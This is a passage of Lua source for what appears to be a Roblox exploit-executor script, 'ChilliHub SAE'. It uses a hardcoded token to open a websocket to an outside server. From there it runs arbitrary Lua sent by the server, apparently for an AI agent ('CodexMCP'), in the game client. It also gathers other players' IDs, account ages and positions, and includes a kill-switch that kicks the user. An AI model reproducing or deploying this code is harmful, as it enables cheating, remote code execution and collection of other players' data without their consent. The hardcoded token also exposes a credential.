		while true do
			task.wait(0.25)
			v15 = fn19()
			if not (v15 or os.clock() > n14) then
				continue
			end
			break
		end
	end

	local flag4 = false

	if v15 then
		local result
		flag4, result = pcall(v15.Ask, "v202")
		flag4 = flag4 and type(result) == "string" and #result > 0
	end

	genv[str] = nil
	if flag4 then
		return
	end

	pcall(function()
		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

		if type(chilliHubSaeCleanup) == "function" then
			chilliHubSaeCleanup()
		end
	end)

	genv.ChilliHubSaeCleanup = nil

	pcall(function()
		local Players2 = game:GetService("Players")
		local tbl22 = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(tbl22, result)
			end
		end

		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl22, playerGui)
		end

		for _, v16 in ipairs(tbl22) do
			for _, child in ipairs(v16:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
	end)
end)

local HttpService2
HttpService2 = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str
str = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local str2
str2 = "wss://chillihub.pro/roblox-mcp?token=" .. str
local str3
str3 = "https://chillihub.pro/roblox-mcp/beat"
local str4
str4 = "SAE v678"
local flag4, flag5, localPlayer2, genv, flag6, flag7, v15, n14, flag8, tbl22
local tbl23, tbl24, n15, fn19, fn20, fn21, fn22, fn23, fn24, fn25
local fn26, fn27, fn28, fn29

do
	local n16 = 7
	local n17 = 500
	local n18 = 245760
	local flag9 = false
	flag4 = false
	flag5 = false
	localPlayer2 = Players2.LocalPlayer
	genv = getgenv and getgenv() or _G

	if type(genv.StopChilliLink) == "function" then
		pcall(genv.StopChilliLink)
	end

	flag6 = true
	flag7 = false
	v15 = nil
	n14 = 0
	flag8 = false
	tbl22 = {}
	tbl23 = {}
	tbl24 = {}
	n15 = 0

	fn19 = function(...)
		if flag9 then
			print("[ROBLOX MCP]", ...)
			return
		end
	end

	fn20 = function(...)
		if flag9 then
			warn("[ROBLOX MCP]", ...)
			return
		end
	end

	fn21 = function(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	fn22 = function(arg, arg2, arg3, arg4)
		local num = tonumber(arg)
		if not num then
			return arg4
		end
		return math.max(arg2, math.min(arg3, num))
	end

	fn23 = function(arg)
		for _, v16 in ipairs(arg) do
			pcall(function()
				v16:Disconnect()
			end)
		end

		table.clear(arg)
	end

	fn24 = function()
		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
			return syn.websocket.connect, "syn.websocket.connect"
		end

		if WebSocket and type(WebSocket.connect) == "function" then
			return WebSocket.connect, "WebSocket.connect"
		end

		if WebSocket and type(WebSocket.new) == "function" then
			return WebSocket.new, "WebSocket.new"
		end

		if WebSocket and type(WebSocket.New) == "function" then
			return WebSocket.New, "WebSocket.New"
		end

		if websocket and type(websocket.connect) == "function" then
			return websocket.connect, "websocket.connect"
		end

		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
			return syn.WebSocket.new, "syn.WebSocket.new"
		end
		return nil, nil
	end

	fn25 = function(arg, ...)
		local v16 = table.pack(...)

		for i = 1, select("#", ...) do
			local value = select(i, table.unpack(v16, 1, v16.n))

			local ok, result = pcall(function()
				return arg[value]
			end)

			if ok and result ~= nil then
				return result, value
			end
		end

		return nil, nil
	end

	fn26 = function(arg, arg2)
		if not arg then
			return nil
		end

		local ok, result = pcall(function()
			return arg:Connect(arg2)
		end)

		return ok and result or nil
	end

	fn27 = function(arg)
		if typeof(arg) ~= "Instance" then
			return nil
		end

		local ok, result = pcall(function()
			return arg:GetFullName()
		end)

		return ok and result or arg.Name
	end

	fn28 = nil

	fn28 = function(arg, arg2, arg3)
		arg2 = arg2 or 0
		arg3 = arg3 or {}
		if n16 < arg2 then
			return "<max-depth>"
		end
		local kind = typeof(arg)
		if arg == nil or kind == "string" or kind == "boolean" then
			return arg
		end

		if kind == "number" then
			if arg ~= arg or arg == math.huge or arg == -math.huge then
				return tostring(arg)
			end
			return arg
		end

		if kind == "Instance" then
			return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn27(arg) }
		end

		if kind == "Vector2" then
			return { type = "Vector2", x = arg.X, y = arg.Y }
		end

		if kind == "Vector3" then
			return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
		end

		if kind == "Color3" then
			return {
				type = "Color3",
				r = math.floor(arg.R * 255 + 0.5),
				g = math.floor(arg.G * 255 + 0.5),
				b = math.floor(arg.B * 255 + 0.5),
			}
		end

		if kind == "UDim" then
			return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
		end

		if kind == "UDim2" then
			return {
				type = "UDim2",
				xScale = arg.X.Scale,
				xOffset = arg.X.Offset,
				yScale = arg.Y.Scale,
				yOffset = arg.Y.Offset,
			}
		end

		if kind == "CFrame" then
			return { type = "CFrame", components = { arg:GetComponents() } }
		end

		if kind == "EnumItem" then
			return tostring(arg)
		end

		if kind == "BrickColor" then
			return { type = "BrickColor", name = arg.Name, number = arg.Number }
		end

		if kind == "table" then
			if arg3[arg] then
				return "<cycle>"
			end
			arg3[arg] = true
			local n19 = 0
			local flag10 = true
			local n20 = 0

			for k in pairs(arg) do
				n19 += 1

				if not (n17 < n19) then
					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
						flag10 = false
					elseif n20 < k then
						n20 = k
					end

					continue
				end

				break
			end

			local tbl25

			if flag10 and n20 <= n17 then
				tbl25 = {}

				for i = 1, n20 do
					tbl25[i] = fn28(arg[i], arg2 + 1, arg3)
				end
			else
				tbl25 = {}
				local v16, v17, v18 = pairs(arg)
				local n21 = 0

				for k, v19 in v16, v17, v18 do
					n21 += 1

					if n17 < n21 then
						tbl25.__truncated = true
						break
					else
						tbl25[tostring(k)] = fn28(v19, arg2 + 1, arg3)
					end
				end
			end

			arg3[arg] = nil
			return tbl25
		end

		return tostring(arg)
	end

	fn29 = function(arg)
		if not flag7 or not v15 then
			return false, "not connected"
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode(fn28(arg))
		end)

		if not ok then
			return false, "JSON encode failed: " .. tostring(result)
		end

		if n18 < #result then
			if not (type(arg) == "table" and arg.type == "rpc_result") then
				return false, "message too large"
			end

			result = HttpService2:JSONEncode({
				type = "rpc_result",
				requestId = arg.requestId,
				success = false,
				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
			})
		end

		local ok2, result2 = pcall(function()
			v15:Send(result)
		end)

		if not ok2 then
			return false, "WebSocket send failed: " .. tostring(result2)
		end
		return true
	end
end

local fn30

fn30 = function(arg, arg2)
	fn29({ type = "rpc_event", event = arg, data = arg2 or {} })
end

local fn31

do
	local tbl25 = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function fn32(arg)
		local tbl26 = {}

		for match in fn21(arg):gmatch("[^%.]+") do
			table.insert(tbl26, match)
		end

		return tbl26
	end

	fn31 = function(arg)
		local v16 = fn32(arg)
		if #v16 == 0 then
			return nil, "path is empty"
		end
		local result = tbl25[v16[1]]

		if not result then
			local ok

			ok, result = pcall(function()
				return game:GetService(v16[1])
			end)

			if not (ok and result) then
				return nil, "unknown root: " .. v16[1]
			end
		end

		for i = 2, #v16 do
			local pathNotFoundAt = v16[i]

			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
				result = localPlayer2
			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
				result = localPlayer2.Character
			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
				result = Workspace.CurrentCamera
			elseif typeof(result) == "Instance" then
				result = result:FindFirstChild(pathNotFoundAt)
			else
				result = nil
			end

			if not result then
				return nil, "path not found at: " .. pathNotFoundAt
			end
		end

		return result
	end
end

local tbl25, fn32

local tbl26 = {
	Archivable = true,
	Anchored = true,
	AssemblyAngularVelocity = true,
	AssemblyLinearVelocity = true,
	AutomaticSize = true,
	BackgroundColor3 = true,
	BackgroundTransparency = true,
	BrickColor = true,
	CanCollide = true,
	CanQuery = true,
	CanTouch = true,
	CanvasPosition = true,
	CanvasSize = true,
	CFrame = true,
	ClipsDescendants = true,
	Color = true,
	Enabled = true,
	FieldOfView = true,
	Health = true,
	Image = true,
	ImageColor3 = true,
	ImageTransparency = true,
	JumpPower = true,
	LayoutOrder = true,
	Material = true,
	MaxHealth = true,
	MoveDirection = true,
	Orientation = true,
	Position = true,
	RichText = true,
	Rotation = true,
	Size = true,
	Text = true,
	TextColor3 = true,
	TextSize = true,
	TextTransparency = true,
	TextWrapped = true,
	Transparency = true,
	Value = true,
	Velocity = true,
	Visible = true,
	WalkSpeed = true,
}

tbl25 = {
	"Archivable",
	"Position",
	"Size",
	"CFrame",
	"Color",
	"Transparency",
	"Visible",
	"Enabled",
	"Text",
	"Value",
	"Health",
	"MaxHealth",
}

fn32 = function(arg, arg2)
	if not tbl26[arg2] then
		return nil, "not_allowed"
	end

	local ok, result = pcall(function()
		return arg[arg2]
	end)

	if ok then
		return fn28(result)
	end
	return nil, "unavailable"
end

local fn33

fn33 = function(arg)
	return {
		name = arg.Name,
		className = arg.ClassName,
		path = fn27(arg),
		parentPath = arg.Parent and fn27(arg.Parent) or nil,
	}
end

local fn34

fn34 = function(arg, arg2, arg3)
	local children = arg:GetChildren()
	local n16 = 1
	local n17 = 0

	while n16 <= #children and n17 < arg2 do
		local v16 = children[n16]
		n16 += 1
		n17 += 1
		if arg3(v16, n17) then
			return n17, true
		end

		if #children < arg2 then
			local children2 = v16:GetChildren()

			for _, v17 in ipairs(children2) do
				if not (arg2 <= #children) then
					table.insert(children, v17)
					continue
				end
				break
			end
		end
	end

	return n17, false
end

do
	local name = "CodexMCP"

	local tbl27 = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local tbl28 = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local tbl29 = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local tbl30 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
	local tbl31 = { AnchorPoint = true, CanvasPosition = true }

	local tbl32 = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local tbl33 = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	local function fn35(arg)
		if type(arg) ~= "table" then
			return nil
		end
		local num = tonumber(arg[1] or arg.r)
		local num2 = tonumber(arg[2] or arg.g)
		local num3 = tonumber(arg[3] or arg.b)
		if not num or not num2 or not num3 then
			return nil
		end

		if num <= 1 and num2 <= 1 and num3 <= 1 then
			return Color3.new(num, num2, num3)
		end
		local floor = math.floor
		return Color3.fromRGB(math.floor(fn22(num, 0, 255, 0)), math.floor(fn22(num2, 0, 255, 0)), floor(fn22(num3, 0, 255, 0)))
	end

	local function fn36(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
	end

	local function fn37(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
	end

	local function fn38(arg)
		if type(arg) == "number" then
			return UDim.new(0, arg)
		end

		if type(arg) ~= "table" then
			return nil
		end
		return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
	end

	local function fn39(arg, arg2)
		if tbl29[arg] then
			return fn35(arg2)
		end

		if tbl30[arg] then
			return fn36(arg2)
		end

		if tbl31[arg] then
			return fn37(arg2)
		end

		if tbl32[arg] then
			return fn38(arg2)
		end

		if tbl33[arg] then
			if typeof(arg2) == "EnumItem" then
				return arg2
			end
			return tbl33[arg][tostring(arg2):match("([^%.]+)$")]
		end

		return arg2
	end

	local function fn40(arg, arg2)
		if type(arg2) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local tbl34 = {}
		local n16 = 0

		for k, v16 in pairs(arg2) do
			if not tbl28[k] then
				table.insert(tbl34, { property = tostring(k), reason = "not_allowed" })
			else
				local v17 = fn39(k, v16)

				if v17 == nil then
					table.insert(tbl34, { property = k, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						arg[k] = v17
					end)

					if ok then
						n16 += 1
					else
						table.insert(tbl34, { property = k, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = n16, rejected = tbl34 }
	end

	local function fn41()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function fn42(arg)
		local v16 = fn41()
		if not v16 then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = v16:FindFirstChild("CodexMCP")

		if not codexMCP and arg then
			codexMCP = Instance.new("ScreenGui")
			codexMCP.Name = name
			codexMCP.ResetOnSpawn = false
			codexMCP.IgnoreGuiInset = false
			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			codexMCP.Parent = v16
		end

		return codexMCP
	end

	local function fn43(arg)
		local v16, v17 = fn42(false)
		if not v16 then
			return nil, v17 or "managed UI does not exist"
		end
		local v18 = fn21(arg)
		if v18 == "" or v18 == name then
			return v16
		end

		for match in v18:gmatch("[^%.]+") do
			if match == name then
				continue
			end
			v16 = v16:FindFirstChild(match)
			if not v16 then
				return nil, "managed UI path not found: " .. match
			end
		end

		return v16
	end

	local tbl34 = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function fn44(arg, arg2)
		if type(arg2) ~= "table" then
			return
		end

		for _, v16 in ipairs(arg2) do
			if tbl34[v16] then
				local ok, result = pcall(function()
					return arg[v16]
				end)

				if ok and result and type(result.Connect) == "function" then
					local connection = result:Connect(function(...)
						local tbl35 = { ... }
						fn30("ui." .. v16, { path = fn27(arg), name = arg.Name, className = arg.ClassName, arguments = fn28(tbl35) })
					end)

					table.insert(tbl24, connection)
				end
			end
		end
	end

	local fn45 = nil

	fn45 = function(arg, parent, arg2, arg3)
		if arg2 > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if arg3.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(arg) ~= "table" then
			error("UI node must be an object")
		end

		local uiClassIsNotAllowed = fn21(arg.class or arg.className)

		if not tbl27[uiClassIsNotAllowed] then
			error("UI class is not allowed: " .. uiClassIsNotAllowed)
		end

		arg3.count = arg3.count + 1
		local instance = Instance.new(uiClassIsNotAllowed)
		instance.Name = fn21(arg.name) ~= "" and fn21(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
		local v16 = fn40(instance, arg.props)
		instance.Parent = parent
		fn44(instance, arg.events)
		local children = type(arg.children) == "table" and arg.children or {}

		for _, child in ipairs(children) do
			fn45(child, instance, arg2 + 1, arg3)
		end

		return instance, v16
	end

	local fn46 = nil

	fn46 = function(arg, arg2, arg3)
		local v16 = fn33(arg)
		if arg2 >= arg3 then
			v16.truncated = #arg:GetChildren() > 0
			return v16
		end
		v16.children = {}

		for _, child in ipairs(arg:GetChildren()) do
			table.insert(v16.children, fn46(child, arg2 + 1, arg3))
		end

		return v16
	end

	local n16 = 60000
	local n17 = 80
	local tbl35 = {}

	local function fn47(...)
		local v16 = table.pack(...)
		local tbl36 = {}

		for i = 1, select("#", ...) do
			local v17 = tostring
			local value = select(i, table.unpack(v16, 1, v16.n))
			tbl36[i] = v17(value)
		end

		return table.concat(tbl36, " ")
	end

	local function fn48(arg, arg2)
		local str5 = tostring(arg or "")

		if str5:match("^%s*$") then
			error("Code is empty", 0)
		end

		local str6 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
		local chunk, v16 = loadstring(str5, str6)

		if not chunk then
			local chunk2 = loadstring("return " .. str5, str6)
			if chunk2 then
				return chunk2
			end
			error("Syntax error: " .. tostring(v16), 0)
		end

		return chunk
	end

	local function fn49(arg)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(arg2, arg3, arg4)
				env[arg3] = arg4
			end,
		})

		rawset(obj, "print", function(...)
			local v16 = table.pack(...)
			arg("print", fn47(...))

			if flag4 then
				print(table.unpack(v16, 1, v16.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local v16 = table.pack(...)
			arg("warn", fn47(...))

			if flag4 then
				warn(table.unpack(v16, 1, v16.n))
			end
		end)

		return obj
	end

	local function fn50(arg)
		local kind = typeof(arg)
		local ok, result = pcall(tostring, arg)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and fn28(arg) or nil,
		}
	end

	local function fn51(arg, arg2, arg3, arg4)
		local tbl36 = {}
		local tbl37 = {}

		for i = 2, arg.n do
			tbl36[i - 1] = fn28(arg[i])
			tbl37[i - 1] = fn50(arg[i])
		end

		return {
			output = table.concat(arg3, "\n"),
			outputTruncated = arg4 or nil,
			returns = tbl36,
			returnsInfo = tbl37,
			returnCount = arg.n - 1,
			elapsedMs = arg2,
		}
	end

	local function fn52(arg)
		return debug.traceback(tostring(arg), 2)
	end

	local function fn53(arg)
		if #arg.pending == 0 then
			return
		end
		local pending = arg.pending
		arg.pending = {}
		fn30("exec.output", { runId = arg.id, label = arg.label, lines = pending })
	end

	local function fn54(arg, arg2)
		local character = arg.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = arg.Name,
			displayName = arg.DisplayName,
			userId = arg.UserId,
			accountAge = arg.AccountAge,
			team = arg.Team and arg.Team.Name or nil,
			neutral = arg.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = arg2 and humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
		}
	end

	local tbl36 = {
		["system.ping"] = function(arg)
			return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(arg)
			local v16 = fn48(arg.code, arg.label)
			local tbl36 = {}
			local n18 = 0
			local flag9 = false

			local v17 = fn49(function(arg2, arg3)
				if flag9 then
					return
				end
				local str5 = (arg2 == "warn" and "[warn] " or "") .. arg3
				n18 = n18 + #str5 + 1

				if n16 < n18 then
					flag9 = true
					table.insert(tbl36, "... output truncated ...")
					return
				end

				table.insert(tbl36, str5)
			end)

			setfenv(v16, v17)
			local now = os.clock()
			local v18 = table.pack(xpcall(v16, fn52))
			local n19 = math.floor((os.clock() - now) * 1000 + 0.5)

			if not v18[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v18[2]), table.concat(tbl36, "\n"):sub(-20000)), 0)
			end

			return fn51(v18, n19, tbl36, flag9)
		end,
		["exec.async"] = function(arg)
			local v16 = fn48(arg.code, arg.label)
			local tbl36 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
			tbl36.label = tostring(arg.label or "Script"):sub(1, 60)
			tbl36.startedAt = os.clock()
			tbl36.pending = {}
			tbl36.lineCount = 0
			tbl36.dropped = 0

			local v17 = fn49(function(arg2, arg3)
				tbl36.lineCount = tbl36.lineCount + 1
				if #tbl36.pending >= n17 then
					tbl36.dropped = tbl36.dropped + 1
					return
				end
				table.insert(tbl36.pending, { kind = arg2, text = arg3:sub(1, 1000) })
			end)

			setfenv(v16, v17)
			tbl35[tbl36.id] = tbl36

			task.spawn(function()
				while tbl35[tbl36.id] == tbl36 do
					task.wait(0.3)

					if tbl36.dropped > 0 then
						table.insert(tbl36.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl36.dropped) })
						tbl36.dropped = 0
					end

					fn53(tbl36)
				end
			end)

			tbl36.thread = task.defer(function()
				local v18 = table.pack(xpcall(v16, fn52))
				if tbl35[tbl36.id] ~= tbl36 then
					return
				end
				tbl35[tbl36.id] = nil
				fn53(tbl36)
				local startedAt = tbl36.startedAt
				local n18 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local tbl37 = { runId = tbl36.id, label = tbl36.label, ok = v18[1] == true, elapsedMs = n18 }

				if v18[1] then
					local v19 = fn51(v18, n18, {}, false)
					tbl37.returnsInfo = v19.returnsInfo
					tbl37.returnCount = v19.returnCount
				else
					tbl37.error = tostring(v18[2]):sub(1, 4000)
				end

				fn30("exec.finished", tbl37)
			end)

			return { runId = tbl36.id, label = tbl36.label }
		end,
		["exec.cancel"] = function(arg)
			local v16 = tbl35[tostring(arg.runId or "")]
			if not v16 then
				return { cancelled = false, reason = "not running" }
			end
			tbl35[v16.id] = nil
			pcall(task.cancel, v16.thread)
			fn53(v16)
			local startedAt = v16.startedAt

			fn30("exec.finished", {
				runId = v16.id,
				label = v16.label,
				ok = false,
				cancelled = true,
				error = "Cancelled from the web console",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = v16.id }
		end,
		["exec.list"] = function()
			local tbl36 = {}

			for k, v16 in pairs(tbl35) do
				local startedAt = v16.startedAt

				table.insert(tbl36, {
					runId = k,
					label = v16.label,
					lines = v16.lineCount,
					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
				})
			end

			return { count = #tbl36, runs = tbl36 }
		end,
		["console.tail"] = function(arg)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local v16 = fn22(arg.limit, 1, 500, 200)
			local n18 = tonumber(arg.since) or 0
			local tbl36 = {}

			for i = #logHistory, 1, -1 do
				local v17 = logHistory[i]

				if not (v17.timestamp <= n18 or #tbl36 >= v16) then
					table.insert(tbl36, 1, {
						message = tostring(v17.message):sub(1, 1000),
						kind = v17.messageType.Name,
						time = v17.timestamp,
					})

					continue
				end

				break
			end

			return { count = #tbl36, entries = tbl36, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n18 }
		end,
		["players.list"] = function(arg)
			local tbl36 = {}
			local flag9 = arg.includePosition ~= false

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(tbl36, fn54(player, flag9))
			end

			table.sort(tbl36, function(arg2, arg3)
				return string.lower(arg2.name) < string.lower(arg3.name)
			end)

			return { count = #tbl36, players = tbl36 }
		end,
		["players.get"] = function(arg)
			local query = arg.query
			local num = tonumber(query)
			local v16 = string.lower(fn21(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if num and player.UserId == num or string.lower(player.Name) == v16 or string.lower(player.DisplayName) == v16 then
					return fn54(player, true)
				end
			end

			error("player not found: " .. tostring(query))
		end,
		["characters.list"] = function()
			local tbl36 = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(tbl36, {
					player = player.Name,
					userId = player.UserId,
					characterPath = character and fn27(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					jumpPower = humanoid and humanoid.JumpPower or nil,
					moveDirection = humanoid and fn28(humanoid.MoveDirection) or nil,
					state = humanoid and tostring(humanoid:GetState()) or nil,
					position = humanoidRootPart and fn28(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and fn28(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #tbl36, characters = tbl36 }
		end,
		["workspace.summary"] = function(arg)
			local n18 = math.floor(fn22(arg.maxDescendants, 1, 5000, 2000))
			local tbl36 = {}
			local tbl37 = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(tbl37, fn33(child))
			end

			local v16 = fn34(Workspace, n18, function(arg2)
				tbl36[arg2.ClassName] = (tbl36[arg2.ClassName] or 0) + 1
				return false
			end)

			return {
				topLevel = tbl37,
				topLevelCount = #tbl37,
				scannedDescendants = v16,
				truncated = v16 >= n18,
				classCounts = tbl36,
			}
		end,
		["instance.find"] = function(arg)
			local v16, v17 = fn31(arg.root or "Workspace")

			if not v16 then
				error(v17)
			end

			local v18 = string.lower(fn21(arg.nameContains))
			local v19 = fn21(arg.className)
			local n18 = math.floor(fn22(arg.limit, 1, 200, 50))
			local tbl36 = {}

			local v20 = fn34(v16, math.floor(fn22(arg.scanLimit, 1, 10000, 3000)), function(arg2)
				local flag9 = v18 == "" or string.find(string.lower(arg2.Name), v18, 1, true) ~= nil
				local flag10 = false

				if v19 ~= "" and arg2.ClassName ~= v19 then
					pcall(function()
						flag10 = arg2:IsA(v19)
					end)
				end

				if flag9 and (v19 == "" or arg2.ClassName == v19 or flag10) then
					table.insert(tbl36, fn33(arg2))
				end

				return #tbl36 >= n18
			end)

			return { root = fn27(v16), scanned = v20, count = #tbl36, matches = tbl36 }
		end,
		["instance.children"] = function(arg)
			local v16, v17 = fn31(arg.path)

			if not v16 then
				error(v17)
			end

			local n18 = math.floor(fn22(arg.limit, 1, 500, 100))
			local children = v16:GetChildren()
			local tbl36 = {}

			for i = 1, math.min(#children, n18) do
				table.insert(tbl36, fn33(children[i]))
			end

			return { parent = fn33(v16), total = #children, returned = #tbl36, children = tbl36 }
		end,
		["instance.inspect"] = function(arg)
			local v16, v17 = fn31(arg.path)

			if not v16 then
				error(v17)
			end

			local tbl36 = {}

			for _, v18 in ipairs(tbl25) do
				tbl36[v18] = true
			end

			if type(arg.properties) == "table" then
				for _, property in ipairs(arg.properties) do
					tbl36[tostring(property)] = true
				end
			end

			local tbl37 = {}
			local tbl38 = {}

			for k in pairs(tbl36) do
				local v18, v19 = fn32(v16, k)

				if v19 then
					tbl38[k] = v19
				else
					tbl37[k] = v18
				end
			end

			return {
				instance = fn33(v16),
				attributes = fn28(v16:GetAttributes()),
				tags = fn28(v16:GetTags()),
				childCount = #v16:GetChildren(),
				properties = tbl37,
				unavailable = tbl38,
			}
		end,
		["instance.attributes"] = function(arg)
			local v16, v17 = fn31(arg.path)

			if not v16 then
				error(v17)
			end

			return { instance = fn33(v16), attributes = fn28(v16:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = fn27(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = fn28(currentCamera.ViewportSize),
				cframe = fn28(currentCamera.CFrame),
				focus = fn28(currentCamera.Focus),
				subject = fn28(currentCamera.CameraSubject),
			}
		end,
